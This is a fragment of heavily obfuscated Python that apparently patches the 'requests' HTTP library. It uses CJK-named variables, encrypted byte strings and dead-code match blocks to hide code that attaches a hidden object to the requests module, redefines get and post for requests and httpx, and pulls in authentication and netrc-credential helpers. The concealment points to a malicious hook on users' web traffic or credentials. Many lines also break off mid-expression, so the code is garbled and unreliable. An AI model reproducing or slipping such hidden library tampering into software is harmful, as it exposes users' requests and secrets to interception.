                response.cookies = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.RequestsCookieJar()
                response.connection = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).adapters.HTTPAdapter()
                response._content = content
                response.history = []
                response.elapsed = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).timedelta(seconds=(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))(), microseconds=(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x03\xe8'))())
                return response
try:
    match '轷稲馴蟐部馚' == '輝怆颚埯尀宦':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            緲橸培哺鬶岚 = [[True], [False]]
            暽掇財豥硿淳(['蘝滎谾鐞真锩'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 挟囝湠午闟鼾:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                襊龻洨桳游来 = [[(lambda: (lambda 淝櫪巠颗凖獀: 淝櫪巠颗凖獀 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 艝侗踆谓嚝闙: 艝侗踆谓嚝闙 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 銰奦圪芯哆圮:
        __import__('requests').ᅠ = ᅠ()
try:
    match '饢啪寡毮錓癴' == '棒顛瑯猪孔変':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            汌厶稺磲靌淌 = [[True], [False]]
            暽掇財豥硿淳(['肚巪臬穙儴摃'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 蹠仛倚庬捀烸:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722245514, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722253465, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245240, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244367, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252511, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244857]))))())())():
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                艌缁鯏恑鉇枽 = [[(lambda: (lambda 譤縮琩膷蓴籗: 譤縮琩膷蓴籗 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 掓鼔鬛鲤埇莎: 掓鼔鬛鲤埇莎 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 兠糦锞賣嫚官:
        __name__ = old__name__
try:
    match '莣鈶荋陬磊品' == '擌艜壏寄砑鉞':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            筧漹钴砋夤憿 = [[True], [False]]
            暽掇財豥硿淳(['橞嚲瓠咭橵勇'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 楼鼡衻寅僂窵:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                爓晚忳攗跋闐 = [[(lambda: (lambda 公颿咿礖绽懨: 公颿咿礖绽懨 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 偺鍚冪猲葠愜: 偺鍚冪猲葠愜 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 囥飱姖匉踍嚞:
        try:
            del ᅠ, old__name__
        except:
            pass
        else:
            pass
        finally:
            pass
try:
    match '聅甦悪櫥軦睶' == '瑛甄浹鞷欤薱':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            躴謬菵蕐嚸琲 = [[True], [False]]
            暽掇財豥硿淳(['栺厜呬奫槻摅'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 喔品挚钻渻钕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                聠影皁飞鍠嶵 = [[(lambda: (lambda 辽囧旺錮掵灜: 辽囧旺錮掵灜 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 补牒襯鲒藐吊: 补牒襯鲒藐吊 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 覶灒澑瑃鎌豵:
        __import__('requests').get
try:
    match '聅甦悪櫥軦睶' == '瑛甄浹鞷欤薱':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            躴謬菵蕐嚸琲 = [[True], [False]]
            暽掇財豥硿淳(['栺厜呬奫槻摅'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 喔品挚钻渻钕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                聠影皁飞鍠嶵 = [[(lambda: (lambda 辽囧旺錮掵灜: 辽囧旺錮掵灜 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 补牒襯鲒藐吊: 补牒襯鲒藐吊 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 覶灒澑瑃鎌豵:
        __import__('httpx').get
try:
    match '脻玻鏸鯃泝髁' == '誙渲歸酅蔤蓌':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            凨燮昱鵰嗈糼 = [[True], [False]]
            暽掇財豥硿淳(['挾繇讇嘮疞毾'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 硟饒呫挧硎臛:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722253387, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722253524, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722258079, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722250547, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249597, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722248203]))))())())():
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                佞亸诛挕襲刈 = [[(lambda: (lambda 偌嘪濝涛苻脊: 偌嘪濝涛苻脊 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 軜忷赶霖刟暄: 軜忷赶霖刟暄 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 翷窾嘸乒虏屝:
        __import__('requests').post
try:
    match '聅甦悪櫥軦睶' == '瑛甄浹鞷欤薱':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            躴謬菵蕐嚸琲 = [[True], [False]]
            暽掇財豥硿淳(['栺厜呬奫槻摅'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 喔品挚钻渻钕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722250191, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722246310, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245502, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244495, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722255444, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722250727]))))())())():
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                聠影皁飞鍠嶵 = [[(lambda: (lambda 辽囧旺錮掵灜: 辽囧旺錮掵灜 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 补牒襯鲒藐吊: 补牒襯鲒藐吊 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 覶灒澑瑃鎌豵:
        __import__('httpx').post
try:
    match '麊悷矋螰溓摛' == '揩漫顳孟醶剕':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            睮毷妯澜鶏漡 = [[True], [False]]
            暽掇財豥硿淳(['欤劈鹸浥咉嬸'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 赚换躵磥噻衭:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722256550, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722257633, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722253175, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249422, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245379, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722261469]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                庫腃袔鑍裈蹫 = [[(lambda: (lambda 暮餳蛄招扈枬: 暮餳蛄招扈枬 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 壄径橢鶔驣糷: 壄径橢鶔驣糷 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 忰酉嶌麒崽鋠:
        from requests.status_codes import codes
try:
    match '萳戌缣缝颐镆' == '媝曥难蚑澐輋':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            筯鲜獃蜋悃怤 = [[True], [False]]
            暽掇財豥硿淳(['蝶棏讷犡乾伈'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 沷傜篍蠙瓹蘣:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                歑料匡軷沩厂 = [[(lambda: (lambda 慟岑睟毄剘偲: 慟岑睟毄剘偲 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 娶萷斋輏驑醛: 娶萷斋輏驑醛 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 斕礳狀辫輸棰:
        from urllib.parse import urljoin, urlparse
try:
    match '輿僰羧傖杷梓' == '饄瑜剗魔櫘匣':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            畜幛蜹霍艭腄 = [[True], [False]]
            暽掇財豥硿淳(['声彑椐霿璥膑'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 巶殩鹣峈佑膃:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                鋥六渮瓁蚿色 = [[(lambda: (lambda 噅皣鶤漶揿厅: 噅皣鶤漶揿厅 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 祕凧夳迓嶓幕: 祕凧夳迓嶓幕 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 辀鸥溣噁璄舺:
        from requests._internal_utils import to_native_string
try:
    match '滫奎訤犉淎檛' == '軪鴓蛙衴嶺郶':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            鈓裥筡絰玍亗 = [[True], [False]]
            暽掇財豥硿淳(['墸竕純菟鲱崓'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 訉蓋麖疭濥趿:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                椶玝棚蜀酳扱 = [[(lambda: (lambda 来茵燈叉桡烄: 来茵燈叉桡烄 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 泵轭諧掚姍菟: 泵轭諧掚姍菟 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 箎遟膱韯榅傂:
        from requests.auth import _basic_auth_str
try:
    match '嚐睄人菔程饧' == '茅膊獻謔岊傍':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            喠豄鐤皣舸波 = [[True], [False]]
            暽掇財豥硿淳(['脠禭阹戃挬觍'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 參瑰快瓐泳薥:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                馠牢恲悓狰醢 = [[(lambda: (lambda 皵煗栥柚萙昜: 皵煗栥柚萙昜 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 澕覜雉噷鳝盦: 澕覜雉噷鳝盦 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 諙艡阹苔討统:
        from requests.cookies import extract_cookies_to_jar, merge_cookies
try:
    match '吾彩诫镼槌呖' == '巈凄閙箿藍稹':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            櫦垟漋夷細嘤 = [[True], [False]]
            暽掇財豥硿淳(['蓝烋掇边淃鸔'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 鳆禜曷椨鞃菗:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                鱘鋍簅節鴞蓴 = [[(lambda: (lambda 莩堪竬嚊擮獌: 莩堪竬嚊擮獌 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 謿諲拽琜朅實: 謿諲拽琜朅實 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 勥骇藜礇赡胒:
        from requests.exceptions import ChunkedEncodingError, ContentDecodingError, TooManyRedirects
try:
    match '貈俇遜娿燻妁' == '銥瓓颪馂徝槌':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            侑領佝癄羔髝 = [[True], [False]]
            暽掇財豥硿淳(['浭庲霖踜腱鯀'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 劑逼鋯戗朏澼:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722249866, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722262448, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722262254, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722255819, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722247486, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722254395]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                顙憍裪砱嚷听 = [[(lambda: (lambda 萱千志嵵檅錘: 萱千志嵵檅錘 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 轨灄氦釾眎駊: 轨灄氦釾眎駊 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 宄輖狨嗄廸蒷:
        from requests.utils import DEFAULT_PORTS, get_auth_from_url, get_environ_proxies, get_netrc_auth, requote_uri, rewind_body, should_bypass_proxies
try:
    match '啢湸狍躺赍逶' == '摍钝瓰划簁琍':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            鐹填辅青棱嘤 = [[True], [False]]
            暽掇財豥硿淳(['腏势舏鷘匃虗'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 経裧滌补焌鉇:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                猼棔駍孮役羏 = [[(lambda: (lambda 绁鐶擭秘合穂: 绁鐶擭秘合穂 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 縻駰嫄囐繁鷧: 縻駰嫄囐繁鷧 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
